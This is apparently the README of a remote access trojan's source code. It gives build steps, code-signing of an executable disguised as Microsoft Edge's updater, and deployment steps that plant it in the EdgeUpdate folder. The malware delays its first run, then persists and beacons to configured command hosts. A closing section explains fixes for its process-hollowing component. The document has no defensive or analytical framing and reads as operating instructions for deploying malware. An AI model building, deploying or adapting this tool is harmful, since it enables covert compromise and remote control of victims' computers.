# com.sun.rt - JVM-resident RAT (source)

## Build
    export JAVA_HOME=/path/to/jdk8
    bash build.sh
    launch4j launch4j.xml
    signtool sign /fd sha256 /a /tr http://timestamp.digicert.com /td sha256 build/msedgeupd.exe

Native needs mingw-w64, xxd, python3.

## Deploy
1. Edit hosts/zone/PSK in core/Config.java.
2. Place msedgeupd.exe + msedgeupd.jar under %LOCALAPPDATA%\Microsoft\EdgeUpdate\.
3. First run sleeps 90 s, then persists and beacons. Later runs pass -boot.

## Known gaps
- hollowSelf() needs payload.inc from a built stub.exe; stub assumes a JRE at
  %ProgramFiles%\Java\jre - adjust for bundled runtimes.
- NtUnmapViewOfSection is used undeclared; include <winternl.h> and drop the
  typedef if your SDK complains.